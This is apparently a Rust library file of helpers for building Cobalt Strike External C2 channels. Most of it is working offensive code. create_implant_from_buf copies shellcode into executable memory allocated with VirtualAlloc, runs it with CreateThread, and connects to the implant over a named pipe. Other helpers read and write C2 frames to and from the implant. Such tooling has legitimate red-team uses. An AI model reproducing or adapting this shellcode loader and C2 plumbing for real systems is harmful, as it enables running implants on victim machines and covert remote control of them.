#![warn(missing_docs)]

//! Helper utilities for creating [external c2][1] systems for [cobaltstrike][2].
//!
//! ![C2](https://i.ibb.co/Cszd81H/externalc2.png)
//!
//!
//!
//![1]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm
//! [2]: https://www.cobaltstrike.com/

use std::{
    ffi::c_void,
    io::{Error, ErrorKind, Read, Write},
    mem, ptr,
    thread::sleep,
    time::Duration,
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileA, ReadFile, WriteFile, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ,
            FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE},
            // Pipes::WaitNamedPipeA,
            Threading::{
                CreateThread, LPTHREAD_START_ROUTINE, THREAD_CREATE_RUN_IMMEDIATELY,
            },
            IO::OVERLAPPED,
        },
    },
};

/// handle to a running cobalt strike implant.  use create implant from buf to create
/// and instance of this struct
pub struct Implant {
    handle: HANDLE,
}
impl Drop for Implant {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.handle);
        }
    }
}

impl Read for Implant {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let size = buf.len();
        let mut bytes_read: u32 = 0;
        unsafe {
            if !ReadFile(
                self.handle,
                buf.as_mut_ptr() as *mut c_void,
                size.try_into().unwrap_or(u32::MAX),
                &mut bytes_read as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                return Err(Error::new(ErrorKind::Other, "Failed to read from pipe"));
            };
        };
        return Ok(bytes_read.try_into().or(Err(Error::new(
            ErrorKind::Other,
            "Failed to convert u32 to usize",
        )))?);
    }
}

impl Write for Implant {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let mut bytes_written: u32 = 0;
        unsafe {
            if !WriteFile(
                self.handle,
                buf.as_ptr() as *const c_void,
                buf.len().try_into().unwrap_or(u32::MAX),
                &mut bytes_written as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                return Err(Error::new(ErrorKind::Other, "Failed to write to pipe"));
            };
        }
        return Ok(bytes_written.try_into().or(Err(Error::new(
            ErrorKind::Other,
            "Failed to convert u32 to usize",
        )))?);
    }

    // This probably needs to be actually implemented but I'm not sure if I need to.
    fn flush(&mut self) -> std::io::Result<()> {
        return Ok(());
    }
}

/// Read a single cobaltstrike frame from from a readable.  A cobalt strike frame is a 32le
/// size followed by a buffer of that size.
pub trait CSFrameRead {
    /// Read the frame.
    fn read_frame(&mut self) -> Result<Vec<u8>, ()>;
}

/// Write a single cobaltstrike frame to a writeable.  writes a 32le size and then the buffer
/// provided.
pub trait CSFrameWrite {
    /// Write the frame.
    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), ()>;
}

impl<T> CSFrameRead for T
where
    T: Read,
{
    fn read_frame(&mut self) -> Result<Vec<u8>, ()> {
        let mut size_buf = [0; 4];
        self.read_exact(&mut size_buf).or(Err(()))?;
        let size = u32::from_le_bytes(size_buf);
        let mut data = vec![0; size.try_into().or(Err(()))?];
        self.read_exact(data.as_mut_slice()).or(Err(()))?;
        return Ok(data);
    }
}
impl<T> CSFrameWrite for T
where
    T: Write,
{
    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), ()> {
        let size: u32 = data.len().try_into().or(Err(()))?;
        self.write_all(&size.to_le_bytes()).or(Err(()))?;
        self.write_all(&data).or(Err(()))?;
        return Ok(());
    }
}

/// Allocates memory and executes cobalt strike shell code and establishes a connection
/// to it over a named pipe.  The returned implant can then be communicated with via
/// read frame and write frame.  Use covert_server to establish a connection to a c2
/// server and get the shell code for a new instance.  ensure that when getting shell
/// code from the c2 server that the pipe name and architecture match.
pub fn create_implant_from_buf(
    shell_code: Vec<u8>,
    pipename: &str,
) -> Result<Implant,()> {
    let full_pipename = format!("\\\\.\\pipe\\{}", pipename);
    unsafe {
        let buf =
            VirtualAlloc(ptr::null(), 512 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                as *mut u8;
        ptr::copy(shell_code.as_ptr(), buf, shell_code.len());
        let buf_addr: unsafe extern "system" fn(*mut c_void) -> u32 =
            mem::transmute(buf);
        let mut threadid: u32 = 0;

        CreateThread(
            ptr::null(),
            0,
            LPTHREAD_START_ROUTINE::Some(buf_addr),
            ptr::null(),
            THREAD_CREATE_RUN_IMMEDIATELY,
            &mut threadid as *mut u32,
        ).or(Err(()))?;

        let mut count = 0;
        loop {
            if let Ok(sock_handle) = CreateFileA(
                PCSTR(full_pipename.as_ptr()),
                FILE_GENERIC_READ | FILE_GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                HANDLE::default(),
            ) {
                return Ok(Implant {
                    handle: sock_handle,
                });
            } else {
                count += 1;
                if count > 10 {
                    return Err(());
                }
                sleep(Duration::from_secs(1));
            };
        }
    }
}
